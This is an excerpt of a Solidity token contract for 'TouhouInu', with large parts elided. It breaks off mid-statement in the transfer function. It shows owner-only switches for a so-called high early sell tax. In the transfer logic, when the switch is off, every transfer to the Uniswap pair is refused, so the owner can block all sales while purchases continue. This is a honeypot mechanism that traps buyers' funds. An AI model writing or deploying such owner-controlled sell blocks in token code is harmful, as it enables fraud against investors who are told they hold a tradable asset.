...
Telegram: https://t.me/Touhouinutoken
***/
...
contract TouhouInu is Context, IERC20, Ownable {
    ...
    function highearlyselltaxStatus(bool _state) public onlyOwner {
        _highearlyselltax = _state;
    ...
    function changehighearlyselltaxTime(uint256 _time) public onlyOwner {
        cooldown = _time;
    }
    ...
    function _transfer(
        ...
        if (!_highearlyselltax) {
            require(to != uniswapV2Pair, " Not available right now");
        } else if (_highearlyselltax && to == uniswapV2Pair) {
            require(
